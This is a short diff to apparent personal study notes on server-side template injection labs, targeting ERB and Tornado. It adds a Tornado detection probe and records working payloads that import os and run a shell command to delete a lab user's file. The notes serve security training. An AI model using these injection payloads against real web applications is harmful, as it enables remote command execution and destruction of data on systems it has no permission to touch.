@@ -11,7 +11,8 @@
 Exploit: `<%=system("rm /home/carlos/morale.txt")%>`
 
 ## Code Context
-- Same as previous
+- Found that tornado uses `}}` after each statement
+    - To detect `}}{{7*7}}`
 - Tornado execute command: {% import os %}{{os.system('rm%20/home/carlos/morale.txt')}}-->
 - Solution: `user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
 
